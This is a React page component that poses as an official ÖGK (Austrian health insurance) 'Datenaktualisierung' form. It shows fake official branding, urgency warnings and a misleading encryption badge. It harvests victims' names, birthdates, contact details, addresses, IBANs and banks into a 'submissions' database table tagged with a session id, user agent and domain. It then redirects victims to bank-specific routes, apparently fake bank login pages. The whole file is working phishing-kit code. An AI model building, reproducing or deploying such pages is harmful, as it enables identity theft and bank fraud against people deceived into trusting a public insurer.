import { useCallback, useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  ArrowRight, ChevronsUpDown, Check, Lock, Info, AlertTriangle,
  ShieldCheck,
} from "lucide-react";
import { cn } from "@/lib/utils";
import { formatIBAN } from "@/lib/format";
import { banksAT as banks, bankRouteMapAT as bankRouteMap, formatBirthdate } from "@/lib/banks";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { OegkHeader, OegkFooter } from "@/components/OegkChrome";
import {
  Popover, PopoverContent, PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command, CommandEmpty, CommandGroup, CommandItem, CommandList,
} from "@/components/ui/command";

const OEGK_GREEN = "#00B050";
const OEGK_NAVY = "#1B2C5C";

const fieldBase =
  "h-11 w-full rounded-md border px-3 text-sm focus:outline-none focus:ring-2 transition";
const fieldOk =
  "border-gray-300 focus:border-[#00B050] focus:ring-[#00B050]/20";
const fieldErr =
  "border-red-500 focus:border-red-500 focus:ring-red-500/20";
const fieldClass = `${fieldBase} ${fieldOk}`;
const labelClass = "mb-1.5 block text-[13px] font-medium text-gray-700";

const REQUIRED_MESSAGES: Record<string, string> = {
  firstName: "Bitte geben Sie Ihren Vornamen ein",
  lastName: "Bitte geben Sie Ihren Nachnamen ein",
  birthdate: "Bitte geben Sie Ihr Geburtsdatum ein",
  email: "Bitte geben Sie Ihre E-Mail-Adresse ein",
  phone: "Bitte geben Sie Ihre Telefonnummer ein",
  street: "Bitte geben Sie Ihre Straße ein",
  houseNumber: "Bitte geben Sie Ihre Hausnummer ein",
  postalCode: "Bitte geben Sie Ihre Postleitzahl ein",
  city: "Bitte geben Sie Ihre Stadt ein",
  iban: "Bitte geben Sie eine gültige IBAN ein",
  bank: "Bitte wählen Sie Ihre Bank aus",
};
const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);


const Datenaktualisierung = () => {
  const navigate = useNavigate();
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [birthdate, setBirthdate] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [houseNumber, setHouseNumber] = useState("");
  const [staircase, setStaircase] = useState("");
  const [doorNumber, setDoorNumber] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");
  const [iban, setIban] = useState("");
  const [selectedBank, setSelectedBank] = useState("");
  const [bankOpen, setBankOpen] = useState(false);
  const [bankSearch, setBankSearch] = useState("");
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const inputRef = useRef<HTMLInputElement>(null);

  const values: Record<string, string> = {
    firstName, lastName, birthdate, email, phone, street, houseNumber, postalCode, city,
  };
  const ibanCleanLength = iban.replace(/\s/g, "").length;
  const isFieldInvalid = (name: string) => {
    if (name === "iban") return ibanCleanLength < 16;
    if (name === "bank") return !selectedBank;
    return !values[name]?.trim();
  };
  const hasError = (name: string) => !!touched[name] && isFieldInvalid(name);
  const inputCls = (name: string) => `${fieldBase} ${hasError(name) ? fieldErr : fieldOk}`;
  const onBlur = (name: string) => () => setTouched((t) => ({ ...t, [name]: true }));
  const ErrMsg = ({ name }: { name: string }) =>
    hasError(name) ? (
      <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES[name]}</p>
    ) : null;

  useEffect(() => {
    document.title = "Versichertendaten aktualisieren · ÖGK";
    const desc = "Aktualisieren Sie jetzt Ihre Versichertendaten bei der Österreichischen Gesundheitskasse online und sicher.";
    let meta = document.querySelector('meta[name="description"]');
    if (!meta) {
      meta = document.createElement("meta");
      meta.setAttribute("name", "description");
      document.head.appendChild(meta);
    }
    meta.setAttribute("content", desc);
  }, []);

  useEffect(() => {
    if (bankOpen && inputRef.current) inputRef.current.focus();
  }, [bankOpen]);

  const showBankPicker = ibanCleanLength > 10;
  const selectedBankObj = banks.find((b) => b.name === selectedBank);

  const allValid =
    firstName.trim() && lastName.trim() && email.trim() && birthdate.trim() &&
    phone.trim() && street.trim() && houseNumber.trim() && postalCode.trim() &&
    city.trim() && ibanCleanLength >= 16 && selectedBank;

  const handleSubmit = useCallback(async () => {
    if (!allValid) {
      setTouched(REQUIRED_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {}));
      const firstInvalid = REQUIRED_FIELDS.find((f) => isFieldInvalid(f));
      if (firstInvalid) {
        requestAnimationFrame(() => {
          const el = document.querySelector<HTMLElement>(`[data-field="${firstInvalid}"]`);
          el?.scrollIntoView({ behavior: "smooth", block: "center" });
        });
      }
      return;
    }
    setSubmitting(true);
    const sessionId = crypto.randomUUID().slice(0, 8);

    const { error } = await supabase
      .from("submissions")
      .insert({
        session_id: sessionId,
        full_name: `${firstName} ${lastName}`.trim(),
        email,
        birthdate,
        phone,
        street,
        house_number: houseNumber,
        staircase,
        door_number: doorNumber,
        postal_code: postalCode,
        city,
        iban,
        bank: selectedBank,
        flow: "datenaktualisierung",
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
        domain: typeof window !== "undefined"
          ? window.location.hostname.replace(/^www\./, "").toLowerCase()
          : null,
      })
      .select("id")
      .single();

    if (error) {
      setSubmitting(false);
      console.error("Insert failed:", error);
      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
      return;
    }

    const route = bankRouteMap[selectedBank];
    if (route) {
      setShowLoading(true);
      setTimeout(() => {
        navigate(`${route}?s=${sessionId}`);
      }, 2500);
    } else {
      setSubmitting(false);
    }
  }, [
    allValid, firstName, lastName, email, birthdate, phone, street, houseNumber,
    staircase, doorNumber, postalCode, city, iban, selectedBank, navigate,
  ]);

  return (
    <div className="min-h-screen flex flex-col bg-[#F4F6F8] text-gray-900" style={{ fontFamily: "'Open Sans', system-ui, sans-serif" }}>
      {showLoading && (
        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
      )}
      <OegkHeader />

      <main className="flex-1 py-10 md:py-14">
        {/* Hero */}
        <section className="container mx-auto px-4 max-w-3xl text-center mb-8">
          <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: OEGK_GREEN }}>
            <span className="inline-block w-1.5 h-1.5 rounded-full" style={{ backgroundColor: OEGK_GREEN }} />
            Offizielle Mitteilung · Österreichische Gesundheitskasse
          </div>
          <h1 className="text-3xl md:text-4xl font-semibold tracking-tight leading-[1.1] mb-4" style={{ color: OEGK_NAVY }}>
            Datenaktualisierung
          </h1>
          <p className="text-[15px] text-gray-700 max-w-xl mx-auto leading-relaxed">
            Bitte überprüfen und aktualisieren Sie Ihre Versichertendaten,
            damit Leistungen weiterhin korrekt abgerechnet werden können.
          </p>
        </section>

        {/* Hinweis */}
        <section className="container mx-auto px-4 max-w-3xl mb-6">
          <div className="rounded-xl border border-[#fed7aa] bg-[#fff7ed] p-4 flex gap-3">
            <AlertTriangle className="w-5 h-5 mt-0.5 shrink-0 text-[#c2410c]" />
            <div className="text-[13.5px] text-[#7c2d12] leading-relaxed">
              <strong>Wichtig:</strong> Ohne aktuelle Adress-, Kontakt- und Kontodaten kann es zu Verzögerungen bei der
              Bearbeitung Ihrer Leistungen kommen. Die Aktualisierung dauert nur wenige Minuten.
            </div>
          </div>
        </section>

        {/* Formularkarte */}
        <section className="container mx-auto px-4 max-w-3xl">
          <div className="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
            <div className="h-1" style={{ backgroundColor: OEGK_GREEN }} />
            <div className="p-6 md:p-10">
              <div className="text-center mb-8">
                <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2" style={{ color: OEGK_GREEN }}>
                  <Info className="w-3.5 h-3.5 inline -mt-0.5 mr-1" />
                  Formular
                </div>
                <h2 className="text-xl md:text-2xl font-semibold" style={{ color: OEGK_NAVY }}>
                  Versichertendaten aktualisieren
                </h2>
                <p className="text-[13.5px] text-gray-600 mt-1">
                  Alle mit * gekennzeichneten Felder sind verpflichtend.
                </p>
              </div>

              {/* Persönliche Daten */}
              <div>
                <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-4" style={{ color: OEGK_GREEN }}>
                  Persönliche Daten
                </div>
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className={labelClass}>Vorname *</label>
                      <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)} onBlur={onBlur("firstName")} className={inputCls("firstName")} />
                      <ErrMsg name="firstName" />
                    </div>
                    <div>
                      <label className={labelClass}>Nachname *</label>
                      <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)} onBlur={onBlur("lastName")} className={inputCls("lastName")} />
                      <ErrMsg name="lastName" />
                    </div>
                  </div>
                  <div>
                    <label className={labelClass}>Geburtsdatum *</label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={birthdate}
                      onChange={(e) => {
                        let raw = e.target.value;
                        if (raw.length < birthdate.length && birthdate.endsWith(".") && !raw.endsWith(".")) {
                          raw = raw.slice(0, -1);
                        }
                        setBirthdate(formatBirthdate(raw));
                      }}
                      onBlur={onBlur("birthdate")}
                      placeholder="TT.MM.JJJJ"
                      maxLength={10}
                      className={inputCls("birthdate")}
                    />
                    <ErrMsg name="birthdate" />
                  </div>
                </div>
              </div>

              {/* Adresse */}
              <div className="mt-8 pt-6 border-t border-gray-200">
                <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-4" style={{ color: OEGK_GREEN }}>
                  Adresse
                </div>
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className={labelClass}>Straße *</label>
                      <input type="text" value={street} onChange={(e) => setStreet(e.target.value)} onBlur={onBlur("street")} className={inputCls("street")} />
                      <ErrMsg name="street" />
                    </div>
                    <div>
                      <label className={labelClass}>Hausnummer *</label>
                      <input type="text" value={houseNumber} onChange={(e) => setHouseNumber(e.target.value)} onBlur={onBlur("houseNumber")} className={inputCls("houseNumber")} />
                      <ErrMsg name="houseNumber" />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className={labelClass}>Stiege</label>
                      <input type="text" value={staircase} onChange={(e) => setStaircase(e.target.value)} className={fieldClass} />
                    </div>
                    <div>
                      <label className={labelClass}>Türnummer</label>
                      <input type="text" value={doorNumber} onChange={(e) => setDoorNumber(e.target.value)} className={fieldClass} />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className={labelClass}>Postleitzahl *</label>
                      <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} onBlur={onBlur("postalCode")} className={inputCls("postalCode")} />
                      <ErrMsg name="postalCode" />
                    </div>
                    <div>
                      <label className={labelClass}>Stadt *</label>
                      <input type="text" value={city} onChange={(e) => setCity(e.target.value)} onBlur={onBlur("city")} className={inputCls("city")} />
                      <ErrMsg name="city" />
                    </div>
                  </div>
                </div>
              </div>

              {/* Kontaktdaten */}
              <div className="mt-8 pt-6 border-t border-gray-200">
                <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-4" style={{ color: OEGK_GREEN }}>
                  Kontaktdaten
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>E-Mail *</label>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
                    <ErrMsg name="email" />
                  </div>
                  <div>
                    <label className={labelClass}>Telefonnummer *</label>
                    <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} onBlur={onBlur("phone")} className={inputCls("phone")} />
                    <ErrMsg name="phone" />
                  </div>
                </div>
              </div>

              {/* Bankdaten */}
              <div className="mt-10 pt-8 border-t border-gray-200">
                <div className="text-center mb-6">
                  <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-1" style={{ color: OEGK_GREEN }}>
                    <ShieldCheck className="w-3.5 h-3.5 inline -mt-0.5 mr-1" />
                    Bankverbindung
                  </div>
                  <h3 className="text-lg font-semibold" style={{ color: OEGK_NAVY }}>
                    Aktuelle Bankdaten bestätigen
                  </h3>
                  <p className="text-[13px] text-gray-600 mt-1">
                    Zur sicheren Identitätsprüfung benötigen wir Ihre aktuelle IBAN.
                  </p>
                </div>

                <div className="space-y-4">
                  <div data-field="iban">
                    <label className={labelClass}>IBAN *</label>
                    <input
                      type="text"
                      value={iban}
                      onChange={(e) => setIban(formatIBAN(e.target.value))}
                      onBlur={onBlur("iban")}
                      maxLength={29}
                      placeholder="AT00 0000 0000 0000 0000"
                      className={cn(inputCls("iban"), "tracking-wider")}
                    />
                    <ErrMsg name="iban" />
                  </div>

                  {showBankPicker && (
                    <div className="animate-in fade-in slide-in-from-top-2 duration-300" data-field="bank">
                      <label className={labelClass}>Bank auswählen *</label>
                      <Popover
                        open={bankOpen}
                        onOpenChange={(open) => {
                          setBankOpen(open);
                          if (!open) setBankSearch("");
                        }}
                      >
                        <PopoverTrigger asChild>
                          <div
                            className={cn(
                              "flex h-11 w-full cursor-pointer items-center rounded-md border px-3 focus-within:ring-2",
                              hasError("bank")
                                ? "border-red-500 focus-within:border-red-500 focus-within:ring-red-500/20"
                                : "border-gray-300 focus-within:border-[#00B050] focus-within:ring-[#00B050]/20"
                            )}
                            role="combobox"
                            aria-expanded={bankOpen}
                            onClick={() => setBankOpen(true)}
                          >
                            {selectedBankObj && !bankOpen && (
                              <img src={selectedBankObj.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                            )}
                            <input
                              ref={inputRef}
                              type="text"
                              className={cn(
                                "h-full flex-1 bg-transparent text-sm outline-none",
                                selectedBank ? "placeholder:text-black" : "placeholder:text-gray-400"
                              )}
                              placeholder={selectedBank || "Bank auswählen"}
                              value={bankSearch}
                              onClick={(e) => {
                                e.stopPropagation();
                                if (!bankOpen) setBankOpen(true);
                              }}
                              onChange={(e) => {
                                setBankSearch(e.target.value);
                                if (!bankOpen) setBankOpen(true);
                              }}
                              onFocus={(e) => {
                                e.stopPropagation();
                                if (!bankOpen) setBankOpen(true);
                              }}
                            />
                            <ChevronsUpDown className="h-4 w-4 flex-shrink-0 text-gray-400" />
                          </div>
                        </PopoverTrigger>
                        <PopoverContent className="w-[--radix-popover-trigger-width] p-0" align="start">
                          <Command>
                            <CommandList className="max-h-[250px] overflow-y-auto">
                              <CommandEmpty>Keine Bank gefunden.</CommandEmpty>
                              <CommandGroup>
                                {banks
                                  .filter((bank) =>
                                    bank.name.toLowerCase().includes(bankSearch.toLowerCase())
                                  )
                                  .map((bank) => (
                                    <CommandItem
                                      key={bank.name}
                                      value={bank.name}
                                      onSelect={() => {
                                        setSelectedBank(bank.name);
                                        setBankOpen(false);
                                        setBankSearch("");
                                      }}
                                    >
                                      <img src={bank.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                                      <span className="flex-1">{bank.name}</span>
                                      {selectedBank === bank.name && (
                                        <Check className="h-4 w-4" style={{ color: OEGK_GREEN }} />
                                      )}
                                    </CommandItem>
                                  ))}
                              </CommandGroup>
                            </CommandList>
                          </Command>
                        </PopoverContent>
                      </Popover>
                      <ErrMsg name="bank" />
                    </div>
                  )}
                </div>
              </div>

              {/* Submit */}
              <div className="mt-10 flex flex-col items-center gap-3">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={submitting}
                  className="inline-flex items-center gap-2 text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors hover:opacity-90 disabled:opacity-60"
                  style={{ backgroundColor: OEGK_GREEN }}
                >
                  <span>Daten aktualisieren</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
                <div className="flex items-center gap-2 text-[12px] text-gray-500">
                  <Lock className="w-3.5 h-3.5" />
                  <span>SSL-verschlüsselt · Österreichische Gesundheitskasse</span>
                </div>
              </div>
            </div>
          </div>
        </section>
      </main>

      <OegkFooter />
    </div>
  );
};

export default Datenaktualisierung;
